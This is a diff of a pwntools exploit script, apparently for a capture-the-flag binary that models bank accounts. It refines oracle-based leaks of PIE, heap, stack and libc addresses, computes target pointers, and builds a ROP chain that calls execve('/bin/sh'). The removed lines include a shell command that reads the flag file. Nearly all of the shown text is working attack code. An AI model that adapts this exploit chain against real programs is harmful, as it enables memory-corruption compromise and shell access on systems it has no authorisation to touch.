@@ -46,7 +46,7 @@ def alloc(msg=None):
     cmd(2)
     if msg:
         data = r.clean(0.1)
-        assert not data
+        assert not data, hexdump(data)
         r.send(msg)
     r.recvuntil('IBAN is ')
     name = r.recvline()[:-1]
@@ -95,31 +95,15 @@ r = conn()
 def main(nstep = 1):
     global r
     info(f'-- step {nstep}: leaking'); nstep += 1
-    MAX_PIE = 0x6ffffffff000 + ((exe.sym.deposit+226) & 0xfff)
     with context.silent:
         a, b, c = [alloc() for x in range(3)]
-    pie_leak = 0
+    pie_leak = (exe.sym.deposit+226) & 0xfff
     with log.progress('leak pie'), context.silent:
         deposit(a, U64_MAX)
         assert transer(a, b, None)
-
-        guesses = []
-        while MAX_PIE > 0:
-            guesses.append(MAX_PIE & 0xf)
-            MAX_PIE >>= 4
-
-        guesses = guesses[::-1]
-        for i, max_digit in enumerate(guesses[:-3]):
-            while max_digit:
-                max_val = max_digit << ((11 - i)*4)
-                debug(f'{max_val = :#x}')
-                if transer(b, c, max_val): break
-                max_digit -= 1
-            else: max_digit = 0
-            guesses[i] = max_digit
-
-        for i, digit in enumerate(guesses):
-            pie_leak += digit << ((11 - i)*4)
+        for i in range(47, -1 + 3, -1):
+            if transer(b, c, 1 << i):
+                pie_leak |= 1<<i
         pass
     info(f'LEAK: {pie_leak = :#x}')
     pie_base = exe.address = pie_leak - (exe.sym.deposit+226)
@@ -128,93 +112,47 @@ def main(nstep = 1):
     with context.silent:
         accounts = [a, b, c] + [alloc() for x in range(32 - 3)]
     d, e, f = accounts[3:][:3]
-    MAX_HEAP = 0x6ffffffffff0
     heap_leak = 0
     with log.progress('leak heap'), context.silent:
         deposit(d, U64_MAX)
         free(accounts[-1])
         assert transer(d, e, None)
 
-        guesses = []
-        while MAX_HEAP > 0:
-            guesses.append(MAX_HEAP & 0xf)
-            MAX_HEAP >>= 4
-
-        guesses = guesses[::-1]
-        for i, max_digit in enumerate(guesses[:-1]):
-            while max_digit:
-                max_val = max_digit << ((11 - i)*4)
-                debug(f'{max_val = :#x}')
-                if transer(e, f, max_val): break
-                max_digit -= 1
-            else: max_digit = 0
-            guesses[i] = max_digit
-
-        for i, digit in enumerate(guesses):
-            heap_leak += digit << ((11 - i)*4)
+        for i in range(47, -1 + 1, -1):
+            if transer(e, f, 1 << i):
+                heap_leak |= 1<<i
         pass
     info(f'LEAK: {heap_leak = :#x}')
     fp_rand_lock_addr = heap_leak - 0x1670
     info(f'CALC: {fp_rand_lock_addr = :#x}')
 
     g, h, j = accounts[6:][:3]
-    MAX_STACK = 0x7fffffffffff
     stack_leak = 0
     with log.progress('leak stack'), context.silent:
         deposit(g, U64_MAX)
         accounts[-1] = alloc()
         assert transer(g, h, None)
-
-        guesses = []
-        while MAX_STACK > 0:
-            guesses.append(MAX_STACK & 0xf)
-            MAX_STACK >>= 4
-
-        guesses = guesses[::-1]
-        for i, max_digit in enumerate(guesses):
-            while max_digit:
-                max_val = max_digit << ((11 - i)*4)
-                debug(f'{max_val = :#x}')
-                if transer(h, j, max_val): break
-                max_digit -= 1
-            else: max_digit = 0
-            guesses[i] = max_digit
-
-        for i, digit in enumerate(guesses):
-            stack_leak += digit << ((11 - i)*4)
+        for i in range(47, -1, -1):
+            if transer(h, j, 1 << i):
+                stack_leak |= 1<<i
         pass
     info(f'LEAK: {stack_leak = :#x}')
     fclose_rbp_ptr = stack_leak - 0x168
     info(f'CALC: {fclose_rbp_ptr = :#x}')
 
     k,l,m = accounts[9:][:3]
-    MAX_LIBC = 0x7fffffffffff
-    libc_leak = 0
+    libc_leak = (libc.sym.puts+474) & 0xfff
     with log.progress('leak libc'), context.silent:
         deposit(k, U64_MAX)
         cmd(8); r.unrecv(r.clean(0.2)[-20:]) # puts("invalid") clobber libc address
         assert transer(k, l, None)
 
-        guesses = []
-        while MAX_LIBC > 0:
-            guesses.append(MAX_LIBC & 0xf)
-            MAX_LIBC >>= 4
-
-        guesses = guesses[::-1]
-        for i, max_digit in enumerate(guesses):
-            while max_digit:
-                max_val = max_digit << ((11 - i)*4)
-                debug(f'{max_val = :#x}')
-                if transer(l, m, max_val): break
-                max_digit -= 1
-            else: max_digit = 0
-            guesses[i] = max_digit
-
-        for i, digit in enumerate(guesses):
-            libc_leak += digit << ((11 - i)*4)
+        for i in range(47, -1 + 3, -1):
+            if transer(l, m, 1 << i):
+                libc_leak |= 1<<i
         pass
     info(f'LEAK: {libc_leak = :#x}')
-    libc_base = libc.address = libc_leak - (libc.sym.__GI__IO_puts+474)
+    libc_base = libc.address = libc_leak - (libc.sym.puts+474)
     assert_page_aligned(libc_base)
 
     info(f'-- step {nstep}: write ropchains from stdin'); nstep += 1
@@ -226,11 +164,13 @@ def main(nstep = 1):
     nread = (32 + 1) * 29
     nremains = 0x1000 - nread
     info(f'we read {nread:#x} bytes, remaining {nremains:#x} bytes')
+
     n = accounts[-1]
     with log.progress('draining fp_rand->buffer'), context.silent:
         for i in range(nremains // 29):
             free(n)
             n = alloc()
+
 
     nremains %= 29
     info(f'\tremaining {nremains:#x} bytes')
@@ -239,7 +179,6 @@ def main(nstep = 1):
     rop.execve(next(libc.search('/bin/sh')), 0, 0)
     rop.exit(0)
     msg = flat({
-        0: b'id; pwd; cat fl* #\0',
         0x900: bytes(rop)
     }, filler=b'8').ljust(0x1000, b'8')
 
